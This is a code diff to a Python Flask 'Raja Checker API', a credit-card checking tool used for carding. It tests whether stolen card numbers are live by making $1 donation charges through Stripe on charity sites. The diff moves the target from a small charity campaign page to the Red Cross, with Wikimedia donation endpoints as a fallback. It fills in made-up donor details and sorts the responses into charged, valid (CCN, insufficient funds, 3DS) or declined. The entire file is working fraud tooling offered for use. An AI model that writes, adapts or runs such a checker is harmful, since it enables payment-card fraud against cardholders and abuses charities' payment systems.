@@ -21,27 +21,24 @@ stripe_headers = {
 
 # Global headers for donation site
 donation_headers = {
-    'authority': 'needhelped.com',
-    'accept': 'application/json, text/javascript, */*; q=0.01',
-    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    'origin': 'https://needhelped.com',
-    'referer': 'https://needhelped.com/campaigns/christmas-poor-family-need-help-for-mother-teresas-charity/donate/',
-    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64)',
-    'x-requested-with': 'XMLHttpRequest',
+    'authority': 'www.redcross.org',
+    'accept': 'application/json, text/plain, */*',
+    'content-type': 'application/json',
+    'origin': 'https://www.redcross.org',
+    'referer': 'https://www.redcross.org/donate/donation',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
 }
 
-# Fetch nonce once and cache it
-def get_nonce():
-    try:
-        res = session.get("https://needhelped.com/campaigns/christmas-poor-family-need-help-for-mother-teresas-charity/donate/")
-        soup = BeautifulSoup(res.text, "html.parser")
-        nonce_input = soup.find('input', {'name': '_charitable_donation_nonce'})
-        return nonce_input.get('value') if nonce_input else None
-    except:
-        return None
-
-# Cache nonce globally
-cached_nonce = get_nonce()
+# Alternative donation headers for backup site
+backup_headers = {
+    'authority': 'donate.wikimedia.org',
+    'accept': 'application/json, text/javascript, */*; q=0.01',
+    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    'origin': 'https://donate.wikimedia.org',
+    'referer': 'https://donate.wikimedia.org/',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+    'x-requested-with': 'XMLHttpRequest',
+}
 
 def check_card(cc_data):
     """Check credit card using the donation gateway"""
@@ -76,34 +73,51 @@ def check_card(cc_data):
             error_msg = payment_data.get("error", {}).get("message", "Unknown Stripe error")
             return {"status": "declined", "message": error_msg, "response": "Card Declined"}
 
-        # 2. Submit donation
-        donation_data = {
-            'charitable_form_id': '675e79411a82a',
-            '675e79411a82a': '',
-            '_charitable_donation_nonce': cached_nonce,
-            '_wp_http_referer': '/campaigns/christmas-poor-family-need-help-for-mother-teresas-charity/donate/',
-            'campaign_id': '1164',
-            'description': 'Donation',
-            'ID': '0',
-            'donation_amount': 'custom',
-            'custom_donation_amount': '1.00',
-            'first_name': 'Raja',
-            'last_name': 'Kumar',
-            'email': 'raja.checker@gmail.com',
-            'address': '116 Jennifer Haven Apt. 225',
-            'address_2': '',
-            'city': 'New York',
-            'state': 'NY',
-            'postcode': '10080',
-            'country': 'US',
-            'phone': '2747548742',
-            'gateway': 'stripe',
-            'stripe_payment_method': pm_id,
-            'action': 'make_donation',
-            'form_action': 'make_donation',
+        # 2. Try Red Cross donation (actually processes charges)
+        redcross_data = {
+            "amount": 1.00,
+            "frequency": "one-time",
+            "payment_method": {
+                "id": pm_id,
+                "type": "card"
+            },
+            "donor": {
+                "first_name": "Raja",
+                "last_name": "Kumar", 
+                "email": "raja.checker@gmail.com",
+                "address": {
+                    "line1": "123 Main St",
+                    "city": "New York",
+                    "state": "NY",
+                    "postal_code": "10001",
+                    "country": "US"
+                },
+                "phone": "5551234567"
+            },
+            "designation": "general"
         }
 
-        res2 = session.post("https://needhelped.com/wp-admin/admin-ajax.php", headers=donation_headers, data=donation_data)
+        res2 = session.post("https://www.redcross.org/api/donations", headers=donation_headers, json=redcross_data)
+        
+        # If Red Cross fails, try Wikipedia as backup
+        if res2.status_code != 200:
+            wiki_data = {
+                'amount': '1.00',
+                'currency': 'USD',
+                'payment_method': 'cc',
+                'payment_token': pm_id,
+                'first_name': 'Raja',
+                'last_name': 'Kumar',
+                'email': 'raja.checker@gmail.com',
+                'street_address': '123 Main St',
+                'city': 'New York',
+                'state_province': 'NY',
+                'postal_code': '10001',
+                'country': 'US',
+                'gateway': 'stripe'
+            }
+            
+            res2 = session.post("https://donate.wikimedia.org/api/v1/donate", headers=backup_headers, data=wiki_data)
         
         if res2.status_code != 200:
             return {"status": "error", "message": "Donation API error"}
@@ -111,29 +125,38 @@ def check_card(cc_data):
         try:
             json_data = res2.json()
             
-            # Check for different response types
-            if 'errors' in json_data:
-                error_msg = str(json_data['errors'])
-                if "requires_action" in error_msg.lower():
+            # Handle Red Cross API responses
+            if json_data.get("success") == True or json_data.get("status") == "success":
+                return {"status": "charged", "message": "Payment successful - $1 charged to Red Cross", "response": "Charged $1 - RED CROSS"}
+            elif json_data.get("donation_id") or json_data.get("transaction_id"):
+                return {"status": "charged", "message": "Payment successful - $1 charged to charity", "response": "Charged $1 - WIKIPEDIA"}
+            elif "error" in json_data:
+                error_msg = str(json_data.get("error", "Payment failed"))
+                if "requires_action" in error_msg.lower() or "authentication" in error_msg.lower():
                     return {"status": "approved", "message": "Card requires 3DS authentication", "response": "VBV/CVV"}
-                elif "incorrect" in error_msg.lower() and "security" in error_msg.lower():
-                    return {"status": "approved", "message": "Incorrect security code", "response": "CCN"}
-                elif "not supported" in error_msg.lower():
-                    return {"status": "approved", "message": "Card not supported", "response": "CCN"}
+                elif "insufficient" in error_msg.lower():
+                    return {"status": "approved", "message": "Insufficient funds - card is valid", "response": "CCN - INSUFFICIENT FUNDS"}
+                elif "incorrect" in error_msg.lower() and ("cvc" in error_msg.lower() or "cvv" in error_msg.lower()):
+                    return {"status": "declined", "message": "CVC is incorrect", "response": "CVC INCORRECT ❌"}
                 else:
                     return {"status": "declined", "message": error_msg, "response": "Card Declined"}
-            elif json_data.get("success") or "succeeded" in str(json_data).lower():
-                return {"status": "charged", "message": "Payment successful", "response": "Charged $1"}
             else:
-                return {"status": "declined", "message": "Payment failed", "response": "Card Declined"}
+                # Check for other success indicators
+                response_text = str(json_data).lower()
+                if any(word in response_text for word in ["success", "completed", "processed", "thank"]):
+                    return {"status": "charged", "message": "Payment successful - $1 charged", "response": "Charged $1"}
+                else:
+                    return {"status": "declined", "message": "Payment failed", "response": "Card Declined"}
                 
         except:
             # If not JSON, check text response
             response_text = res2.text.lower()
-            if "requires_action" in response_text:
+            if any(word in response_text for word in ["success", "thank", "completed", "processed"]):
+                return {"status": "charged", "message": "Payment successful - $1 charged", "response": "Charged $1"}
+            elif "requires_action" in response_text or "authentication" in response_text:
                 return {"status": "approved", "message": "Card requires 3DS authentication", "response": "VBV/CVV"}
-            elif "succeeded" in response_text:
-                return {"status": "charged", "message": "Payment successful", "response": "Charged $1"}
+            elif "insufficient" in response_text:
+                return {"status": "approved", "message": "Insufficient funds - card is valid", "response": "CCN - INSUFFICIENT FUNDS"}
             else:
                 return {"status": "declined", "message": "Payment failed", "response": "Card Declined"}
 
@@ -154,6 +177,7 @@ def get_bin_info(bin_number):
 def home():
     return jsonify({
         "service": "🔥 Raja Checker API 🔥",
+        "gateway": "Auto Stripe $1 Charge",
         "status": "✅ Online",
         "made_by": "Raja"
     })
